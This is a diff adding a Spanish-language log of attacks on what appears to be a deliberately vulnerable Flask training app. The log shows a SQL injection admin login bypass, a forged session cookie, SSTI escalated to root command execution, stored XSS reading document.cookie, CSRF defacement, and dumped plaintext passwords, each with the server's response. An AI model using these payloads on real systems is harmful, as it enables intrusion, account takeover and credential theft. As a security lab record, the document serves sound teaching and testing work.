@@ -1,0 +1,34 @@
+### 1) SQLi: login como admin sin password (username=admin' --)
+HTTP/1.1 302 FOUND
+Location: /dashboard
+Set-Cookie: user_session=admin; Path=/
+
+### 2) Cookie falsificable: Cookie user_session=admin sin login
+    <h1>Panel de admin</h1>
+    <p><b>Rol:</b> admin</p>
+
+### 3) SSTI: bio={{7*7}} se evalúa en el servidor
+    <p><b>Biografía:</b> 49</p>
+    <h3>Actualizar Biografía (Objetivo CSRF)</h3>
+
+### 5) XSS almacenado: <script> se guarda y se devuelve sin escapar
+    <p><b>Biografía:</b> <script>alert(document.cookie)</script></p>
+    <h3>Actualizar Biografía (Objetivo CSRF)</h3>
+
+### 6) CSRF: POST sin token desde otro origen es aceptado
+HTTP/1.1 302 FOUND
+Location: /dashboard
+    <p><b>Biografía:</b> ESTA CUENTA FUE HACKEADA</p>
+    <h3>Actualizar Biografía (Objetivo CSRF)</h3>
+
+### 7) Cabeceras del servidor (versión expuesta, sin CSP/XFO)
+Server: Werkzeug/2.2.2 Python/3.12.16
+
+### 8) Contraseñas en texto plano en la BD
+[('admin', 'admin123'), ('alumno', '12345')]
+
+### 4b) SSTI -> RCE (payload sin comillas; comando en parámetro c): ejecuta 'id' y 'uname -a' en el contenedor
+    <p><b>Biografía:</b> uid=0(root) gid=0(root) groups=0(root)
+</p>
+    <p><b>Biografía:</b> Linux 835081d2e010 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64 GNU/Linux
+</p>
